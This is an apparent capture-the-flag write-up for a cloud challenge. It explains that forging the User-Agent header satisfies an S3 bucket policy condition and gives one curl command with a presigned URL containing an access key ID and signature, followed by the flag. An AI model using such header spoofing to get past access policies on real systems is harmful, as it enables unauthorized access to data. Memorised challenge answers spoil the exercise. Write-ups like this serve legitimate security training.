Spoof user agent to meet the condition in the resource policy.

`curl -A "aws-sdk-go/1.44.0" "https://kickme-95f596ff5b61453187fbc1c9faa3052e.s3.us-east-1.amazonaws.com/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAXC42U7VJ7MRP6INU%2F20250715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250715T124755Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=6cefb6299d55fb9e2f97e8d34a64ad8243cdb833e7bdf92fc031d57e96818d9b"`

Flag: DUCTF{youtube.com/watch?v=A20QQSZsv4E}

Solved by: 0xad3n